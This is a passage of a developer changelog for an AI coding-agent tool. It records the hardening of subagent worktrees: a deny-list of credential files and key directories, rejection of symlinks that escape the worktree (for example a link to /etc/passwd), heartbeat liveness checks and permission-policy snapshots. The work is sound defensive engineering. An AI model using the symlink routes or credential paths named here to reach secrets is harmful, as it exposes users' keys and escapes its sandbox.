- **Validation lift covers BOTH gates (`writes:true` AND `requiresBgManager`).** With worktree isolation, writes are contained; with the new bg log dir, bg tools are isolated. So a `bash_background` tool under `isolation: 'worktree'` is now fully accepted. Under `isolation: 'none'`, the writes gate still fires for `bash_background` because subagent-spawned processes can write to the parent's tree — that's a separate concern (tracked by writes:true), not a bg concern.

**Pending / known limitations:**

- **No `agent worktree gc` integration yet.** A subagent run that crashed mid-execution before the end-of-run rmSync ran would leave its bg log dir behind. Not a security issue (the dir is the parent's responsibility, not the child's), and the disk cost is bounded by the number of concurrent subagent crashes; 4.2d's gc command will sweep these alongside stale worktrees.
- **Per-process resource isolation.** A subagent that spawns 10 long-lived bg processes still consumes the parent's process table and disk space for log files. Future limits (max-bg-per-subagent, max-log-size) would land in the subagent budget structure (`max_steps`, `max_cost_usd`, plus a future `max_bg_processes`). Out of scope for this slice — current usage profile shows even active subagents rarely exceed 1-2 bg processes at a time.
- **Concurrent subagents on the same parent session.** Each subagent gets a unique `<sessionId>` subdirectory, so directory collisions are impossible. The bg manager's per-process IDs are also session-scoped (not global), so two subagents running concurrently can't see each other's processes through `bash_output` even if they had the same bg ID. ✓ Verified by construction.

**Verification:** `bun test` 1377 pass / 10 skip / 0 fail (+5 new positive tests including SIGKILL-orphan-reap, PID-recycle skip, and basename match coverage; 4 inverted tests); `tsc --noEmit` clean; `biome check` clean.

**Next:** With 4.2b.iv landed, the 4.2b arc is complete. M3 / Step 4.2c — checkpoints inside worktrees (per-step git snapshots on the agent branch so `/undo` works inside subagent runs). Then 4.2d — `agent worktree gc` + merge helpers (operator commands for stale worktree sweep and branch merge-back ergonomics).

---

## [2026-04-30] M3 / Step 4.2b.iii follow-up #4 — force literal pathspecs in worktree git calls

The skip-worktree threading from follow-up #1 fed validator-removed
paths to `git ls-files` and `git update-index`, both of which parse
positional arguments as pathspecs by default. A deny-listed filename
with pathspec metacharacters (e.g. `[abc].pem`, a legal Linux
filename matching `*.pem` in the deny-list) would be interpreted as
a bracket character class — `[abc]` matches `a`/`b`/`c` — so
`ls-files` returned `a.pem`/`b.pem`/`c.pem` (if present) instead of
the literal `[abc].pem`. The literal file never got its
skip-worktree flag, and unrelated tracked files COULD get marked,
silently masking any real child edits to them at cleanup time.

**Done:**

| File | Change |
|---|---|
| `src/subagents/worktree.ts` | `runGit` and the bespoke `update-index --stdin` spawn both set `GIT_LITERAL_PATHSPECS=1` in their child env. The flag is global per git invocation: every pathspec argument is taken as a literal pathname, no glob/regex/bracket interpretation. Inert for path-typed args of `git worktree add` / `branch -D` (those don't pass through the pathspec engine), correct for `ls-files` / `update-index` / `status` / `worktree remove`. |
| `tests/subagents/worktree.test.ts` | +1 regression test: commit `[abc].pem` (literal brackets) AND `a.pem`, run createWorktree, assert both validator-removed and `git status --porcelain` empty in the worktree, cleanup classifies removed. Without the fix, `[abc].pem` would show as ` D [abc].pem` (never masked) and cleanup would preserve indefinitely. |

**Decisions:**

- **`GIT_LITERAL_PATHSPECS=1` env-wide vs `:(literal)` per-arg.** Env wins on invariance: every git call from this module gets the same semantics, no risk of forgetting the prefix on a future call site. The flag is a no-op for non-pathspec args, so the blast radius is what we want.
- **No alternative escape mechanism explored.** `git update-index --add --chmod` accepts pathspecs the same way; any future expansion of the validator's git ops will inherit the literal-pathspec posture automatically because they go through the same `runGit` helper.

**Verification:** `bun test` 1373 pass / 10 skip / 0 fail (+1 new); `tsc --noEmit` clean; `biome check` clean.

**Next:** unchanged — M3 / Step 4.2b.iv (`bgLogDir` per-worktree, lifts the `requiresBgManager` gate).

---

## [2026-04-30] M3 / Step 4.2b.iii follow-up #3 — detect child re-writes hidden by skip-worktree

The skip-worktree mask from follow-up #1 introduced an inverse
hazard: it makes `git status` ignore EVERY change to the masked
paths, not just the validator's deletion. A child that re-creates
or modifies a masked file (writes a new `.env`, plants a new
`.ssh/key_*`) would be invisible to `git status --porcelain`,
classified as a clean worktree, and silently removed at cleanup
along with the child's writes — losing run output and masking
post-validation mutations on exactly the paths the deny-list
flagged as sensitive.

**Done:**

| File | Change |
|---|---|
| `src/subagents/worktree.ts` | `WorktreeHandle` gains a `maskedPaths: string[]` field populated from `validation.deniedRemoved.map(d => d.path)`. `cleanupWorktree` runs an `lstatSync` sweep over each masked path BEFORE the `git status --porcelain` check; any path that exists in any form (regular file, symlink, directory, dangling symlink) classifies the worktree as dirty and triggers preserve. The lstat (not `existsSync`) is deliberate: `existsSync` follows symlinks and returns false for dangling targets, but a dangling-symlink ENTRY at a masked path is still a child mutation worth surfacing to the operator. |
| `tests/subagents/worktree.test.ts` | +3 regression tests: child re-creates `.env` with new content (skip-worktree silences `git status` → only the lstat sweep catches it), child plants a dangling symlink at `.env` (lstat picks it up where existsSync wouldn't), child rebuilds `.ssh/` with new contents (directory case). All three assert dirty + preserved + content survives on disk for operator inspection. |

**Decisions:**

- **lstat, not existsSync.** Symlink-as-dangling-link is a child mutation that must be visible to the operator; existsSync would silently drop it. The cost (one extra branch in fs lookup) is irrelevant compared to correctness.
- **Track top-level `deniedRemoved.path`, not the expanded tracked file list.** When the validator removes `.ssh/` it expands via `git ls-files -z` to mark every tracked file under `.ssh/` as skip-worktree, but the lstat sweep only needs to know "did this top-level entry come back" — a single lstat on `.ssh` detects any re-creation under it (file, dir, symlink). Storing the expanded list would bloat the handle for no gain.
- **Sweep runs FIRST, before status.** The lstat check is cheap (handful of syscalls) and unambiguous (path exists or doesn't). Doing it ahead of `git status` means the dirty path is detected even if some other status query bug or git misbehavior also masked the change.
- **No "unmask + re-status" path.** We could in principle `git update-index --no-skip-worktree` the paths and re-query status; the lstat sweep is simpler, doesn't mutate the index in cleanup, and gives the same answer. The current design treats the index as immutable in cleanupWorktree.

**Verification:** `bun test` 1372 pass / 10 skip / 0 fail (+3 new); `tsc --noEmit` clean; `biome check` clean.

**Next:** unchanged — M3 / Step 4.2b.iv (`bgLogDir` per-worktree, lifts the `requiresBgManager` gate).

---

## [2026-04-30] M3 / Step 4.2b.iii follow-up #2 — close deny-list bypass via symlink name

Second review pass on 4.2b.iii surfaced another security gap that
the two-pass walker introduced. Pass 2 originally skipped EVERY
symlink (the rationale being that pass 1 had already enforced the
boundary check). But the deny-list isn't only about boundary —
it's about NAMES the child can read by path. A repo committing
`.env -> secrets.txt` (target inside the worktree, target name
not deny-listed) bypassed the filter completely: pass 1 accepted
the symlink (target inside boundary), pass 2 skipped it, and the
child reading `.env` resolved through the OS to `secrets.txt`
and got the secret bytes.

**Done:**

| File | Change |
|---|---|
| `src/subagents/worktree-validation.ts` | Pass 2's symlink branch now matches the symlink's NAME against `matchSensitivePath` (file pattern) AND `isSensitiveDirectory` (`.ssh`-style dir patterns via the `_probe` heuristic). Either trip removes the symlink ENTRY without resolving the target — the resolved file (if inside the worktree) is processed independently when the walker reaches it. `rmSync(absPath, { force: true })` unlinks symlinks without following, so a `.ssh -> regular-dir/` symlink gets the link removed while the underlying directory is left for the walker's regular dir branch. Header comment updated to reflect the new pass-2 contract. |
| `tests/subagents/worktree-validation.test.ts` | +4 tests under `symlink-name deny-list (bypass guard)`: `.env -> secrets.txt` regression, `.ssh -> regular-dir` (sensitive-dir name), `subdir/.env -> ../keep.txt` (any-depth), `link -> .env` (innocuous-name preserved with dangling target — proves the C1 case still holds under the new rules). |
| `tests/subagents/worktree.test.ts` | +1 end-to-end integration test: commit `.env -> secrets.txt` (relative target so pass-1 boundary doesn't preempt the deny-list test), createWorktree + cleanup; asserts symlink removed, target survives, status clean (skip-worktree mask covers the tracked symlink deletion too), cleanup classifies removed. |

**Decisions:**

- **Match symlink name only, never resolve target.** Two reasons. (1) Resolution is pass-1 work; pass 2 must be deterministic w.r.t. file deletions and re-resolving would re-introduce order dependencies. (2) The semantic is "what can the child read at this path": the resolved file, evaluated by its own name, gets its own walker visit if it's inside the worktree. Keeping the responsibilities separate avoids double-deletion and keeps the deny-list logic uniform across files and symlinks.
- **`force: true`, not `recursive: true` for symlink rm.** `rmSync` on a symlink unlinks the symlink entry without following it, even when the symlink targets a directory. `recursive: true` would invite the rare bug of accidentally walking THROUGH a symlink-to-dir; force=true is the minimal flag set that swallows ENOENT (defensive against double-removal that shouldn't happen but isn't worth a noisy throw).
- **Skip-worktree masking already covers tracked symlink deletions.** The createWorktree post-processing runs `git ls-files -z -- <removedPath>` which returns the symlink path if tracked (git tracks symlink entries the same way it tracks regular files at the index level); the `update-index --skip-worktree` call then masks the deletion from `git status`. No additional plumbing needed for the symlink deletions to be cleanup-clean.

**Verification:** `bun test` 1369 pass / 10 skip / 0 fail (+5 new); `tsc --noEmit` clean; `biome check` clean.

**Next:** unchanged — M3 / Step 4.2b.iv (`bgLogDir` per-worktree, lifts the `requiresBgManager` gate).

---

## [2026-04-30] M3 / Step 4.2b.iii follow-up — skip-worktree mask for deny-list deletions

The 4.2b.iii closing entry left a critical bug uncaught by the
review: `validateWorktreeContents` deleted tracked files via
`rmSync`, which surfaces as ` D <file>` lines in
`git status --porcelain`. `cleanupWorktree` treats any non-empty
status as dirty and preserves the worktree forever — every
subagent run against any repo that commits a `.env` / `*.pem`
/ SSH key would leak a worktree + agent branch indefinitely.
Cache root would fill with leftovers and orphan branches on
every run, defeating the slice's auto-cleanup contract.

**Done:**

| File | Change |
|---|---|
| `src/subagents/worktree.ts` | `createWorktree` now captures the `ValidationResult` from `validateWorktreeContents` and threads it into a new `markValidatorDeletionsSkipWorktree` helper. The helper enumerates tracked files under each removed path via `git ls-files -z` (single files return themselves; sensitive directories like `.ssh/` expand to every tracked descendant), then batch-marks them with `git update-index --skip-worktree -z --stdin`. Skip-worktree failures are non-fatal — the worst case is a preservation `agent worktree gc` (4.2d) reconciles. |
| `tests/subagents/worktree.test.ts` | +2 regression tests: (a) full create + cleanup cycle on a repo committing `.env` + `cert.pem` + `.ssh/` asserts `git status --porcelain` empty in the worktree, cleanup classifies `removed=true`, no orphan branch left; (b) child writes through the worktree still trip the dirty check (skip-worktree mask is surgical, doesn't suppress genuine work). |

**Decisions:**

- **Why `--skip-worktree`** (and not `git rm` / status-output filter / chmod / leave-tracked-untouched):
  - `git rm` + commit on the agent branch mutates history; a later merge of the agent branch back into main would propagate the deletion of `.env`. Wrong.
  - Filtering `git status --porcelain` lines in `cleanupWorktree` against a known-removed list works but pushes validator semantics into cleanup; any future consumer that runs `git status` without going through cleanupWorktree (helpers, debug tooling, the `agent worktree gc` sweep) sees the dirty state and re-introduces the bug.
  - `chmod 0000` doesn't physically remove the bytes (they sit on disk for the run's duration) and may or may not show as modified depending on `core.fileMode`.
  - Leaving tracked deny-listed files in place defeats the deny-list's purpose (child can read them through the OS regardless of tool-level checks that are still M2 work).
  - `--skip-worktree` is per-worktree (no history mutation), surgical (only the validator's removed paths), and dies with `git worktree remove` (no cleanup needed).
- **Helper enumerates via `git ls-files -z` per removed path.** Handles single files (returns the path) and directory removals (`.ssh/` returns every tracked file inside) uniformly. Untracked deny-listed deletions (e.g. user's `.env.local` not committed) return empty from `ls-files` and skip the update-index call — no-op when the deletion never showed in status anyway.
- **Batch via `--stdin -z`.** A `.gnupg/` with hundreds of keyfiles would risk argv overflow if we passed paths inline. `--stdin` + `-z` accepts NUL-separated paths from stdin and matches the format `ls-files -z` already produces, so we just join and write.
- **skip-worktree failures non-fatal.** The validator already accepted the worktree as secure; failing the run because git refused to flip an index bit would be over-strict. The worst case (preserved-but-cleanable worktree at end of run) is exactly what the operator's `agent worktree gc` (4.2d) is for.

**Verification:** `bun test` 1364 pass / 10 skip / 0 fail (+2 new); `tsc --noEmit` clean; `biome check` clean.

**Next:** unchanged — M3 / Step 4.2b.iv (`bgLogDir` per-worktree, lifts the `requiresBgManager` gate).

---

## [2026-04-30] M3 / Step 4.2b.iii — symlink hardening + sensitive-path deny-list

The 4.2b.ii.b closing entry left two SECURITY §8.4 rails open: a
symlink committed to HEAD that resolves outside the worktree
(host-secrets exfil), and `.env` / `*.pem` / SSH key material
that lands inside the worktree just because git tracks it. The
runtime created the worktree, the child got `cwd` pointed at it,
and the child's read tools could resolve those paths through
the OS without any defense in depth. This slice closes both
rails with a pre-spawn validator that runs inside
`createWorktree` after `git worktree add` succeeds but before
the child gets `cwd`.

**Done:**

| File | Change |
|---|---|
| `src/subagents/sensitive-paths.ts` | NEW — `SENSITIVE_PATH_DENY_LIST` constant mirroring SECURITY_GUIDELINE §8.4 verbatim + `matchSensitivePath(relPath, patterns?)` matcher (Bun.Glob, two-probe normalization for any-depth matching). Lives in its own module so future read/write tool consumers (§8.4 points 1 and 2) import the same source of truth without pulling worktree code. |
| `src/subagents/worktree-validation.ts` | NEW — `validateWorktreeContents({worktreePath, denyListPatterns?})` walks the worktree tree (manual recursion, NOT `readdirSync({recursive:true})` — that would silently follow directory symlinks). Per-entry `lstat` detects symlinks; `realpathSync` resolves and prefix-matches the worktree's realpath'd root. Files matching the deny-list are deleted; sensitive directories (`.ssh/**`, `.gnupg/**`) are removed wholesale via a `_probe` child-path test. `WorktreeValidationError` carries `code` + `path` for telemetry. |
| `src/subagents/worktree.ts` | Validator wired in after `git worktree add` succeeds. Validator throw → rollback (`git worktree remove --force` + `git branch -D` + best-effort `rmSync`) before re-throw, mirroring the existing `add` failure path. Updated header comment to remove the "out of scope for 4.2a" note. |
| `tests/subagents/sensitive-paths.test.ts` | NEW — 16 tests covering the matcher: anchored patterns, any-depth normalization, `.env.*` vs `.envoy` (false-positive guard), `.aws/credentials` exact match without sweeping `.aws/`, custom override list, posix normalization for Windows-style separators. Includes a snapshot of the canonical list as a regression guard against accidental edits. |
| `tests/subagents/worktree-validation.test.ts` | NEW — 20 tests on the walker directly (no git): symlink boundary (allowed inside, rejected absolute-out, rejected `../../`-out, broken target, deeply nested), deny-list (root `.env`, multi-depth `*.pem`, `.ssh/` recursive removal, `.aws/credentials` without sweeping the whole dir, `**/credentials*.json` at any depth), edge cases (empty worktree, custom override, non-existent root, `.git` directory skipped). |
| `tests/subagents/worktree.test.ts` | +2 integration tests through `createWorktree`: rejects worktree whose HEAD has an out-of-bounds symlink (asserts cache root empty + branch list pristine after rollback), strips deny-listed files (`.env` + `cert.pem`) while preserving non-sensitive files. |
| `tests/subagents/runtime.test.ts` | Activated the `.skip` left by 4.2b.ii.a — symlink rejection surfaces at runtime as `status='error', reason='worktree_create_failed'` with no child session row, no audit row, no orphan branch. |

**Decisions (D1-D7 locked):**

- **D1 — Symlink escaping: REJECT, not sanitize.** Sanitizing silently mutates a worktree that reflects a commit the user authored; that masks a malicious commit. Rejection forces the user to inspect what's in the repo. Map: `WorktreeValidationError(symlink_escapes_worktree)` → rollback inside `createWorktree` → `runSubagent` returns `worktree_create_failed`.
- **D2 — Deny-listed files: DELETE silently.** Not a malicious-vs-not violation; just scope segregation. The child has nothing legitimate to do with `.env` even if the project ships one. Throwing would block any project that legitimately commits a placeholder `.env`. The deletion is cheap; the parent's source tree is untouched.
- **D3 — Manual recursive descent (not `readdirSync({recursive:true})`).** The recursive form follows directory symlinks without surfacing them as symlinks — a `dirty -> /etc/passwd` directory symlink would walk straight out of the worktree before the validator ever inspected it. Per-entry `lstat` is the only safe approach.
- **D4 — Bun.Glob, no regex.** CLAUDE.md hard rule + spec uses globs natively. Two probes per pattern (literal + `**/`-prefixed) give any-depth semantics without inventing pattern syntax. The matcher's first-hit behavior means more-specific patterns can shadow less-specific ones (`id_rsa*` beats `.ssh/**` for `.ssh/id_rsa`); that's fine — both flag the file as sensitive.
- **D5 — Sensitive *directory* detection via probe.** A `_probe` child path is matched against the deny-list; if any pattern hits, the whole directory is `rmSync` recursive. This handles `.ssh/**` cleanly while keeping `.aws/credentials` (file-level) from sweeping `.aws/` (which can ship legitimate non-sensitive content). The probe filename is unlikely to collide with any specific file pattern.
- **D6 — `.git` always skipped.** In a linked worktree it's the gitlink file pointing at the admin dir; the parent repo owns admin state, never the validator. Skipping by name (not stat) is faster and tolerates the rare case where a fixture writes a `.git` directory.
- **D7 — Override hierarchy DEFERRED.** Spec §8.4 lists four override layers (`/trust path`, playbook frontmatter, `agent.toml`, `~/.config/agent/security.toml`). Three of those depend on subsystems that don't exist yet (playbooks, agent.toml schema, global security config). The hardcoded canonical list is the safer floor; PRs that need overrides will land alongside the consuming subsystem (M5 playbooks for the playbook-level layer, M6 trust for `/trust path`).
- **D8 (post-review) — Two-pass walker, NOT mixed pass.** Initial design walked the tree once, validating symlinks and deleting files in the same loop. Code review caught that `readdirSync` order made spawn nondeterministic when a repo committed both a deny-listed file (`.env`) AND a symlink pointing at it (`link -> .env`): if `.env` iterated first, deletion left the symlink dangling and `realpath` threw `symlink_unresolvable` on the next iteration; if the symlink came first, validation accepted and the run proceeded. Pass 1 now validates ALL symlinks against the boundary, pass 2 then deletes deny-listed files / sensitive directories. Symlinks that target soon-to-be-deleted files are accepted in pass 1 (target intact), then dangle after pass 2 — child can't follow ENOENT, security preserved, spawn deterministic. Same fix closes the symlink-into-sensitive-directory case (M1 from review).
- **D9 (post-review) — Resolved target redacted from `symlink_escapes_worktree` message.** The message is the only text artifact that may flow into logs / audit / telemetry; the resolved target is the host-side secret path the symlink was trying to read, and embedding it would defeat the purpose of refusing to read the file. The operator gets the symlink path via `error.path` and can `readlink` it themselves for forensic investigation. Spec §6 redaction principle applied defensively even though the validator's caller doesn't currently log the message.

**Out of scope (deferred):**

- **Read/write tool runtime enforcement.** §8.4 points 1 and 2 mandate that `read_file`, `outline_file`, `read_symbol`, `write_file`, `edit_file` all check the deny-list at call time. The matcher is now ready for them to import; the wiring is M2 tool work, not 4.2b.
- **§8.4 override hierarchy** (D7 above).
- **Heuristic warning for `0600`/`0400` files with sensitive keywords.** Spec calls this a *warning* (not a block), needs a UX surface (operator notification channel). Lands with the operator-warnings infrastructure later in M3 or M4.
- **Symlinks created by the child mid-run.** Pre-spawn validation catches HEAD state; a `write_file` that creates a malicious symlink during the run is the permission matcher's problem (already handles symlink resolution per `tests/permissions/symlink.test.ts`). Defense in depth, not redundant.
- **Audit row capture of `deniedRemoved`.** The validator returns the list of removed files but `createWorktree` discards it. Wiring it into the worktree audit row (or a new `subagent_run.security_events` field) is forensic value, not security value — defer until operator workflows demand it.

**Pending / known limitations:**

- **Race between checkout and validation.** `git worktree add` writes the tree, then we validate. A privileged process modifying the worktree between those two steps could plant a symlink the validator never sees. Linux FS doesn't give us a clean atomic checkpoint; mitigation is the cache root's `0700` mode (already enforced) which makes the race a non-issue under any sane operator setup. Worth re-evaluating if the threat model expands to multi-tenant hosts.
- **`realpath` requires the target to exist.** Broken symlinks are rejected (D1 generalization). A repo that legitimately commits a dangling symlink (placeholder for build-time generation) can't be a subagent worktree source until the target is created or the symlink removed. Acceptable trade-off; document via the error message.
- **Probe filename collision (`_probe`).** A pattern like `**/_probe` would trip `isSensitiveDirectory` for every directory and wipe the whole worktree. The current canonical list has no such pattern; if a future addition gets close to this shape, the probe needs to be randomized or the implementation switched to literal-pattern inspection. Low priority.

**Verification:** `bun test` 1362 pass / 10 skip / 0 fail (+43 new across matcher, walker, two-pass invariants, integration, and runtime activation); `tsc --noEmit` clean; `biome check` clean.

**Next:** M3 / Step 4.2b.iv — `bgLogDir` per-worktree (lifts the `requiresBgManager` gate). Subagents currently can't run `bun run dev` or any background-managed tool; the gate refuses under any isolation because the bg log directory is global and would mix child output into operator workflows. Per-worktree `bg-logs/` directory + scoped manager closes the gap. After .iv, the 4.2b arc is done; 4.2c lands checkpoints inside worktrees and 4.2d ships `agent worktree gc` + merge helpers.

---

## [2026-04-30] M3 / Step 4.2b.ii.b — heartbeat liveness for subprocess subagents

The 4.2b.ii.a closing entry left wall-clock (10min default) as
the only liveness gate. A child wedged inside a tool call
(provider request hung, sync block) would respond to signals but
never publish payload — operators saw 10min hangs before
detection. Spec FAILURE_MODES §7.3 mandates `last_heartbeat`-based
detection: the column was ready since 4.2b.i (migration 014),
the writer + poller were the missing wiring. This slice closes
that gap.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/cli/subagent-child.ts` | UPDATED | New `HEARTBEAT_CADENCE_MS = 2000` constant. After `insertSubagentOutput` succeeds, install background `setInterval(updateSubagentHeartbeat, 2000)`. unref'd so the timer doesn't pin the event loop alive past child exit. Cleared in the outer finally before `db.close()` so the interval body never races a closed handle. Errors swallowed in the body — a transient SQLite hiccup must not crash the harness. |
| `src/subagents/runtime.ts` | UPDATED | New `HEARTBEAT_STALE_THRESHOLD_MS = 10_000` constant. `WaitOutcome` gains `'heartbeat_stale'` kind. `RunSubagentResult.reason` union grows `'heartbeat_stale'`. `RunSubagentInput.heartbeatStaleMs?` test seam. `waitForChild` now reads `out.lastHeartbeat` from the same fetch that checks payload; when non-null and gap > threshold and not already killed, escalates SIGTERM → grace → SIGKILL via the existing `scheduleKill()` helper. `killed` type widened to include `'heartbeat_stale'`. New outcome maps to `status='interrupted', reason='heartbeat_stale'` in the result envelope. |
| Tests | NEW + UPDATED | runtime: stale heartbeat triggers escalation (3 tests — stale fires SIGTERM/SIGKILL, healthy heartbeat survives tight threshold, null heartbeat treated as pre-pulse not stale). subagent-child: 1 e2e test — slow provider holds the loop ~2.3s, asserts `last_heartbeat` was written by the production interval (verifies the writer reaches the DB at the production cadence). |

**Decisions:**

- **Cadence 2000ms (child).** Threshold 10000ms (parent). 5×
  cadence headroom absorbs transient SQLite contention,
  GC pauses, and the parent's poll backoff cadence (50ms→500ms)
  without false positives. MCP's heartbeat analog (60s,
  AUDIT.md §1.5) is more conservative; subagents are tighter
  because the worst-case wall-clock fallback (10min) is too
  long for "operator notices something wrong" timing.
- **Background `setInterval`, NOT a step-boundary hook.** The
  failure mode this catches is "child loop blocked inside a
  tool". A step-boundary hook stops pulsing exactly when we
  need the pulse most. Background interval keeps tickling
  while async I/O is mid-flight, only stops when the JS event
  loop itself blocks — which IS the wedge signal. The trade-
  off: a fully event-loop-deadlocked child wouldn't pulse,
  which is exactly what we want.
- **`unref()` on the interval handle.** Bun timers ref the
  event loop by default; without unref, a forgotten clear
  would hold the child process alive past its natural exit.
  Mirrors the same defense as the SIGKILL escalation timers
  in runtime.ts (commit `f63b456`).
- **Threshold gate skips `lastHeartbeat === null`.** The
  child inserts the outputs row at startup, BEFORE the first
  interval tick (~2s gap). The parent's poller MUST treat
  null as "pre-pulse" not "stale" — otherwise every
  subprocess subagent would die on its first poll. Test
  `null lastHeartbeat does NOT trip stale detection` locks
  this behavior with a tight 1ms threshold + null heartbeat.
- **Reuse of `scheduleKill()` infra.** Same SIGTERM → grace
  → SIGKILL escalation as the wall-clock and abort paths.
  The `killed` flag prevents re-firing when subsequent poll
  iterations also see staleness. The 2×grace bail-out path
  applies uniformly to all kill verdicts.
- **`heartbeatStaleMs` exposed as test seam, NOT user-facing
  config.** The default of 10s is hard-coded into the spec
  semantics ("> wall_clock_timeout" is too lax; "every
  cadence" is too tight; the 5× cadence-multiple is the
  Goldilocks). Production callers omit; tests pass small
  values to exercise the path quickly.

**What this DOESN'T close:**

- **Child wedged inside synchronous code that blocks the
  event loop.** Example: `while(true) {}` in a tool. The
  `setInterval` won't fire because the loop is held. Wall-
  clock catches this via the parent's `setTimeout`-based
  budget enforcement (which runs in the parent's event loop,
  not the child's). 10min latency in that mode; acceptable
  because synchronous infinite loops in production code are
  the edge case the wall-clock was designed for.
- **Operator-facing CLI for stale detection.** `--list-sessions`
  doesn't expose `last_heartbeat` age. Out of scope; lands
  with `agent worktree gc` in 4.2d when operator workflows
  for stale subagents become a deliberate surface.
- **Heartbeat history.** Single column means we have only
  the latest pulse. No detection of "child pulsed for a while
  then stopped" patterns beyond "did pulse at all" + "is it
  recent". 4.2b.iv could add a sample buffer if forensic
  patterns prove valuable; defer until demand exists.

**Verification:** `bun test` 1318 pass / 11 skip / 0 fail (+4
new across stale-detection paths and the e2e cadence probe);
`tsc --noEmit` clean; `biome check` clean.

**Next:** M3 / Step 4.2b.iii — symlink hardening + deny-list
copy filter (SECURITY_GUIDELINE §8.4). Worktree subagents that
write currently inherit any pre-existing symlinks in the parent
commit; an `.env` symlink pointing outside the repo would let
a child read host-level secrets. Static deny-list pattern set
+ runtime realpath validation closes the gap. After .iii, .iv
(bgLogDir per-worktree, lifts `requiresBgManager` gate) finishes
the 4.2b arc; then 4.2c (checkpoints inside worktree) and 4.2d
(`agent worktree gc` + merge helpers) for operator surface.

---

## [2026-04-30] M3 / Step 4.2b.ii.a follow-up — policy snapshot

The 4.2b.ii.a closing entry left M2 (policy drift between
parent spawn and child read) as Pending, deferred to .ii.b.
Closing it now in a follow-up because the cost is small (one
column + one engine getter) and the race window is real:
between the parent's `bootstrap()` (which calls `resolvePolicy`
+ `createPermissionEngine`) and the child's startup (which used
to call `resolvePolicy` again), a human edit to
`.agent/permissions.yaml` (or any layer above) could run the
child under different rules than the parent had validated.
Worst case: a tool the parent confirmed was allowed surfaces
as denied (or vice versa) inside the same logical run.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/permissions/engine.ts` | UPDATED | New `PermissionEngine.policy()` returns a `structuredClone` of the captured Policy. Deep copy is defensive — a future caller mutating the result MUST NOT corrupt the engine's enforcement state. |
| `src/storage/migrations/015-subagent-runs-policy.ts` | NEW | `ALTER TABLE subagent_runs ADD COLUMN policy_snapshot TEXT NOT NULL DEFAULT '{}'`. Pre-015 rows get the empty-object default; the read path patches in strict-mode defaults so a pre-migration row falls through to maximally restrictive interpretation. |
| `src/storage/repos/subagent-runs.ts` | UPDATED | `SubagentRun.policySnapshot: Policy` field. `insertSubagentRun` accepts `policySnapshot?: Policy`. Defensive read parse fills `defaults.mode='strict'` and `tools={}` when shape is structurally incomplete (corruption or pre-015). |
| `src/subagents/runtime.ts` | UPDATED | `runSubagent` persists `input.permissionEngine.policy()` on the audit row before spawn. Uses the engine's getter — no direct dependency on the resolver. |
| `src/cli/subagent-child.ts` | UPDATED | Builds the permission engine from `audit.policySnapshot` directly. **Removed** the `resolvePolicy(...)` call entirely. Test seams `enterprisePolicyPath` / `userPolicyPath` removed (no longer meaningful — child doesn't read disk policy). |
| Tests | NEW + UPDATED | `tests/permissions/engine.test.ts` (+1 — mutation on returned policy doesn't affect engine), `tests/cli/subagent-child.test.ts` (+3 — round-trip with bypass+sentinel snapshot, real-gate probe `bypass allows / strict denies`, pre-015 row falls back to strict). Tool-call status assertions probe the actual gate (read_file under bypass lands `done`, under strict lands `denied`) — not just round-trip. |

**Decisions:**

- **`PermissionEngine.policy()` returns a deep copy via
  `structuredClone`, not the captured reference.** A shared
  reference would let any caller mutate the engine's
  enforcement state (e.g., flipping `defaults.mode` to
  `bypass` on a strict engine). The cost is negligible
  (~µs for sub-10KB policies); the latent-bug surface a
  shared reference would expose is the relevant size.
  `JSON.parse(JSON.stringify(...))` would also work but
  loses Date/Map shapes if a future Policy type grows them;
  structuredClone preserves them.
- **Schema as `ALTER TABLE ... ADD COLUMN ... NOT NULL
  DEFAULT '{}'`, not a parallel table.** The audit lives
  with the rest of the run's snapshot (system_prompt,
  tools_whitelist, budget). Splitting policy into its own
  table would force a join on every forensic query for
  zero gain — the row is 1:1 with subagent_runs anyway.
  The `'{}'` default is the safe fallback for pre-migration
  rows: parses as an empty object, the read path detects
  the missing `defaults.mode` and patches in `'strict'`.
  Strict is the maximally restrictive interpretation of
  "policy snapshot unknown" — denies everything by default,
  zero risk of accidentally elevating permissions.
- **Read-path defensive parse fills missing required
  fields with strict defaults.** `JSON.parse('{}')` yields
  `{}` which lacks `defaults.mode` — calling
  `engine.check()` on that crashes with `undefined is not
  an object (evaluating 'policy.defaults.mode')`. The
  parse path explicitly checks for the required Policy
  shape (`defaults` object, `tools` object) and falls back
  per-field to strict. Same defensive shape used for
  `tools_whitelist` parse (migration 012).
- **`subagent-child.ts` no longer calls `resolvePolicy`.**
  The test seams `enterprisePolicyPath` / `userPolicyPath`
  are gone — they made sense when the child re-resolved
  disk; with the snapshot path they're dead. Tests that
  want a specific policy seed it via the parent's
  `insertSubagentRun(..., policySnapshot)` directly.
- **`InsertSubagentRunInput.policySnapshot` is optional.**
  Production callers (the runtime) MUST supply it; the
  optional shape covers older test fixtures and rare
  programmatic callers without breaking them. Omitting
  serializes `'{}'` and falls back to strict on read —
  safe but maximally restrictive.

**Review fixes (pre-commit).** Self-review surfaced 1 medium
(structuredClone) and 1 medium (real-gate probe). Both
addressed in the same commit:

- **M2 — `engine.policy()` returned a mutable reference.**
  Latent bug for any future caller beyond `JSON.stringify`.
  Fixed via `structuredClone`. Test asserts mutation on the
  returned policy (top-level field, nested object, nested
  array) does not affect engine `mode()` or `check()`
  behavior; a fresh `policy()` call still returns the
  original shape.
- **M3 — bypass-vs-strict round-trip didn't probe actual
  gate behavior.** A regression that silently substituted
  the snapshot before engine creation would still pass a
  round-trip-only test. Added a stronger probe: two
  children with identical `read_file` tool_use scripts and
  identical whitelists, differing only in `policySnapshot`.
  Bypass child's tool_call lands `status='done'` (gate
  passed); strict child's lands `status='denied'` (gate
  denied). Same fixture, two snapshots, two outcomes —
  proves the snapshot drives real enforcement.

**Pending (deferred — not blocking):**

- **M1 — `lockConflicts` not in snapshot.** `resolvePolicy`
  returns `{ policy, layers, lockConflicts }`; the audit
  persists only `policy`. Effects of locks ARE baked into
  the resolved policy (enforcement is correct), but
  forensic detail "which layer originated this rule?" is
  lost. Could add a sibling `policy_audit` field with
  `{ layers, lockConflicts }` in a future migration if the
  forensic shape grows demand.
- **m1 — `{ ...obj, defaults, tools }` carries unknown
  top-level fields.** A snapshot with extra keys round-trips
  unchanged; not a correctness issue but shape pollution.
  Strict whitelist of known Policy keys would tighten;
  defer until the Policy type stabilizes (currently the
  type itself allows arbitrary additional sections per
  future spec growth).
- **m2 — Pre-015 rows store `'{}'` literally.** Raw
